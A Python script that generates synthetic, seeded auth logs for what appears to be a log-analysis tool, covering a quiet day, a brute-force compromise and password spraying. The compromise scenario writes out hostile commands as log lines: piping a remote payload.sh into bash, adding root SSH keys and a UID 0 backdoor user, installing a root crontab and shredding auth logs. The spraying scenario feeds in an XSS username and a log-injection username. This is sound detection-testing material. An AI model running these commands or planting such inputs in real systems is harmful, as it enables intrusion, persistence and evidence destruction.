"""Generate the synthetic sample logs in samples/.

The samples are fiction: hosts, users and addresses are made up, and every public
address comes from the RFC 5737 / RFC 3849 documentation ranges, which never
route on the internet. A fixed seed makes the output identical on every run, so
the committed samples can always be regenerated and checked:

    python tools/make_samples.py
"""

import random
from datetime import datetime, timedelta
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "samples"


class Log:
    def __init__(self, host, fmt, seed):
        self.host, self.fmt, self.lines = host, fmt, []
        self.rng = random.Random(seed)
        self.pid = 4000

    def next_pid(self):
        self.pid += self.rng.randint(3, 40)
        return self.pid

    def add(self, ts, prog, msg, pid=None):
        if self.fmt == "bsd":
            stamp = f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S}"
        else:
            stamp = ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{self.rng.randint(0, 999999):06d}+00:00"
        tag = f"{prog}[{pid}]" if pid else prog
        self.lines.append((ts, len(self.lines), f"{stamp} {self.host} {tag}: {msg}"))

    def port(self):
        return self.rng.randint(32768, 60999)

    # ---- building blocks

    def key_login(self, ts, user, ip, minutes, sudo=(), uid=1000):
        pid, port = self.next_pid(), self.port()
        self.add(ts, "sshd", f"Accepted publickey for {user} from {ip} port {port} ssh2: "
                             f"ED25519 SHA256:{self.rng.randbytes(8).hex()}", pid)
        self.add(ts, "sshd", f"pam_unix(sshd:session): session opened for user {user}(uid={uid}) by (uid=0)", pid)
        self.add(ts + timedelta(seconds=1), "systemd-logind", f"New session {pid % 97} of user {user}.",
                 self.next_pid())
        t = ts
        for command in sudo:
            t += timedelta(seconds=self.rng.randint(20, 240))
            self.sudo(t, user, command)
        end = ts + timedelta(minutes=minutes)
        self.add(end, "sshd", f"Received disconnect from {ip} port {port}:11: disconnected by user", pid)
        self.add(end, "sshd", f"pam_unix(sshd:session): session closed for user {user}", pid)
        return pid

    def sudo(self, ts, user, command, pwd=None, reason=None):
        pwd = pwd or f"/home/{user}"
        head = f"   {user} : {reason + ' ; ' if reason else ''}TTY=pts/{self.rng.randint(0, 3)} ; "
        self.add(ts, "sudo", f"{head}PWD={pwd} ; USER=root ; COMMAND={command}")

    def failures(self, ts, ip, user, tries, valid=True):
        """One SSH connection with `tries` failed passwords, using rsyslog's repeat collapsing."""
        pid, port = self.next_pid(), self.port()
        who = user if valid else f"invalid user {user}"
        if not valid:
            self.add(ts, "sshd", f"Invalid user {user} from {ip} port {port}", pid)
        self.add(ts, "sshd", f"Failed password for {who} from {ip} port {port} ssh2", pid)
        if tries > 1:
            self.add(ts + timedelta(seconds=3), "sshd",
                     f"message repeated {tries - 1} times: [ Failed password for {who} from {ip} "
                     f"port {port} ssh2]", pid)
        end = ts + timedelta(seconds=2 + 2 * tries)
        closer = "authenticating user" if valid else "invalid user"
        self.add(end, "sshd", f"Connection closed by {closer} {user} {ip} port {port} [preauth]", pid)
        return end

    def cron(self, ts):
        pid = self.next_pid()
        self.add(ts, "CRON", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)", pid)
        self.add(ts + timedelta(seconds=1), "CRON", "pam_unix(cron:session): session closed for user root", pid)

    def write(self, name):
        text = "\n".join(line for _, _, line in sorted(self.lines)) + "\n"
        (OUT / name).write_text(text, encoding="utf-8", newline="\n")
        print(f"wrote samples/{name}: {len(self.lines)} lines")


def quiet_server():
    """An ordinary day: admin work, one mistyped password, and internet background noise."""
    log = Log("web01", "bsd", seed=1)
    day = datetime(2026, 10, 27)
    for hour in range(0, 24):
        log.cron(day + timedelta(hours=hour, minutes=17))
    log.key_login(day + timedelta(hours=8, minutes=2), "admin", "10.20.0.15", 43, sudo=[
        "/usr/bin/apt update", "/usr/bin/apt upgrade -y", "/usr/bin/systemctl restart nginx",
        "/usr/bin/tail -n 100 /var/log/nginx/error.log"])
    t = day + timedelta(hours=13, minutes=10)
    log.add(t, "sshd", "Failed password for alice from 10.20.0.31 port 50122 ssh2", 5101)
    log.add(t + timedelta(seconds=6), "sshd", "Accepted password for alice from 10.20.0.31 port 50122 ssh2", 5101)
    log.add(t + timedelta(seconds=6), "sshd",
            "pam_unix(sshd:session): session opened for user alice(uid=1001) by (uid=0)", 5101)
    log.sudo(t + timedelta(minutes=2), "alice", "/usr/bin/journalctl -u nginx --since today")
    log.add(t + timedelta(minutes=3), "su", "(to root) alice on pts/1", 5150)
    log.add(t + timedelta(minutes=31), "sshd", "pam_unix(sshd:session): session closed for user alice", 5101)
    # Background noise every internet-facing server sees: a few guesses, well under any threshold.
    for ip, user, n, hour in [("198.51.100.200", "root", 3, 4), ("203.0.113.99", "oracle", 2, 11),
                              ("192.0.2.150", "admin", 1, 19)]:
        log.failures(day + timedelta(hours=hour, minutes=log.rng.randint(0, 59)), ip, user, n,
                     valid=user != "oracle")
    log.key_login(day + timedelta(hours=17, minutes=30), "deploy", "10.20.0.40", 2,
                  sudo=["/usr/bin/systemctl reload nginx"], uid=1002)
    log.write("01_quiet_server.log")


def compromise():
    """Brute force that succeeds, followed by a full post-exploitation sequence."""
    log = Log("db01", "bsd", seed=2)
    day = datetime(2026, 10, 28)
    for hour in range(0, 24):
        log.cron(day + timedelta(hours=hour, minutes=9))
    log.key_login(day + timedelta(hours=1), "admin", "10.20.0.15", 12, sudo=["/usr/bin/apt update"])

    attacker, t = "203.0.113.45", day + timedelta(hours=2, minutes=58)
    users = [("root", True), ("admin", True), ("ubuntu", False), ("test", False), ("postgres", True)]
    while t < day + timedelta(hours=3, minutes=13, seconds=30):
        user, valid = log.rng.choice(users)
        t = log.failures(t, attacker, user, log.rng.randint(1, 3), valid) + timedelta(seconds=log.rng.randint(4, 15))

    t = day + timedelta(hours=3, minutes=14, seconds=7)
    pid = 7781
    log.add(t, "sshd", f"Failed password for admin from {attacker} port 51122 ssh2", pid)
    log.add(t + timedelta(seconds=4), "sshd", f"Accepted password for admin from {attacker} port 51122 ssh2", pid)
    log.add(t + timedelta(seconds=4), "sshd",
            "pam_unix(sshd:session): session opened for user admin(uid=1000) by (uid=0)", pid)
    log.add(t + timedelta(seconds=5), "systemd-logind", "New session 41 of user admin.", 611)

    steps = [
        (55, lambda ts: log.sudo(ts, "admin", "/usr/bin/id")),
        (73, lambda ts: log.sudo(ts, "admin", "/bin/bash")),
        (154, lambda ts: log.add(ts, "useradd", "new group: name=sysadm, GID=1002", 7810)),
        (154, lambda ts: log.add(ts, "useradd", "new user: name=sysadm, UID=0, GID=0, home=/root, "
                                                "shell=/bin/bash, from=/dev/pts/1", 7810)),
        (178, lambda ts: log.add(ts, "usermod", "add 'sysadm' to group 'sudo'", 7815)),
        (178, lambda ts: log.add(ts, "usermod", "add 'sysadm' to shadow group 'sudo'", 7815)),
        (203, lambda ts: log.add(ts, "passwd", "pam_unix(passwd:chauthtok): password changed for sysadm", 7820)),
        (305, lambda ts: log.sudo(ts, "admin", "/usr/bin/bash -c curl -fsSL http://198.51.100.77/payload.sh | bash")),
        (453, lambda ts: log.sudo(ts, "admin", "/usr/bin/tee -a /root/.ssh/authorized_keys")),
        (596, lambda ts: log.sudo(ts, "admin", "/usr/bin/crontab -u root /tmp/.c")),
        (828, lambda ts: log.sudo(ts, "admin", "/usr/bin/shred -u /var/log/auth.log.1")),
    ]
    for offset, step in steps:
        step(t + timedelta(seconds=offset))
    log.add(t + timedelta(minutes=15, seconds=3), "sshd", "pam_unix(sshd:session): session closed for user admin", pid)

    # A second, unrelated attacker who never gets in: noise, not an incident.
    t = day + timedelta(hours=5, minutes=2)
    for _ in range(6):
        t = log.failures(t, "198.51.100.12", "root", 3) + timedelta(seconds=log.rng.randint(5, 20))

    log.key_login(day + timedelta(hours=9, minutes=12), "alice", "10.20.0.31", 25,
                  sudo=["/usr/bin/tail -n 50 /var/log/auth.log"], uid=1001)
    t = day + timedelta(hours=11, minutes=40)
    log.key_login(t, "bob", "10.20.0.44", 20, uid=1003)
    for minutes, command in [(3, "/usr/bin/cat /etc/shadow"), (4, "/usr/bin/cat /etc/shadow"), (6, "/bin/bash")]:
        log.sudo(t + timedelta(minutes=minutes), "bob", command, reason="user NOT in sudoers")
    log.write("02_bruteforce_compromise.log")


def spray():
    """Password spraying, a key-only scanner, a distributed attack and an IPv6 brute force."""
    log = Log("bastion", "iso", seed=3)
    day = datetime(2026, 10, 30)
    log.key_login(day + timedelta(hours=9), "admin", "10.30.0.2", 30, sudo=["/usr/bin/systemctl status sshd"])

    sprayer, t = "198.51.100.23", day + timedelta(hours=14)
    names = ["admin", "administrator", "user", "test", "guest", "oracle", "postgres", "ubuntu", "pi",
             "git", "jenkins", "ftp", "deploy", "dev", "support", "mysql", "backup", "ansible", "hadoop",
             "nagios", "minecraft", "ec2-user", "centos", "vagrant", "docker",
             # Hostile usernames: one tries to frame an internal address, one is an XSS payload.
             "x from 10.0.0.5 port 22 ssh2", "<script>alert(1)</script>"]
    existing = {"admin", "git", "deploy", "ubuntu"}
    for name in names:
        t = log.failures(t, sprayer, name, log.rng.choice([1, 1, 1, 2]), valid=name in existing)
        t += timedelta(seconds=log.rng.randint(20, 50))

    # A scanner against key-only accounts: sshd rejects unknown users before any password is
    # tried, so there are "Invalid user" lines but no "Failed password" lines at all.
    t = day + timedelta(hours=14, minutes=40)
    for name in ["oracle", "test", "user", "ftpuser", "support", "guest", "ubnt", "admin1", "tomcat", "sonar"]:
        pid, port = log.next_pid(), log.port()
        log.add(t, "sshd", f"Invalid user {name} from 198.51.100.99 port {port}", pid)
        log.add(t + timedelta(seconds=1), "sshd",
                f"Connection closed by invalid user {name} 198.51.100.99 port {port} [preauth]", pid)
        t += timedelta(seconds=log.rng.randint(15, 40))

    # Distributed attack: six addresses take turns at one account, each staying quiet.
    t = day + timedelta(hours=15)
    for _ in range(3):
        for i in range(11, 17):
            log.failures(t, f"192.0.2.{i}", "deploy", log.rng.randint(1, 2))
            t += timedelta(minutes=log.rng.randint(1, 4))
    # The CI system logs in with its key in the middle of it: not a compromise.
    log.key_login(day + timedelta(hours=15, minutes=20), "deploy", "10.30.0.8", 1, uid=1002)

    t = day + timedelta(hours=16, minutes=10)
    for _ in range(5):
        t = log.failures(t, "2001:db8:bad::7", "root", 3) + timedelta(seconds=log.rng.randint(5, 15))
    log.key_login(day + timedelta(hours=17, minutes=5), "root", "2001:db8:10::5", 4, uid=0)
    log.write("03_spray_and_distributed.log")


if __name__ == "__main__":
    OUT.mkdir(exist_ok=True)
    quiet_server()
    compromise()
    spray()
